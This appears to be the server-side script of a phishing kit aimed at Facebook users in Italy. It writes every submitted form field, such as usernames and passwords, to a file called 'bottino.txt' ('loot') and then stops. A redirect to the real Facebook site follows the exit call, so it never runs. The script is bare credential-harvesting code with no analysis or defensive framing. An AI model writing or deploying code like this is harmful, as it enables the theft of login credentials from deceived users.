<?php
$handle = fopen("bottino.txt", "a");
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
header('Location: http://it-it.facebook.com/');
?> 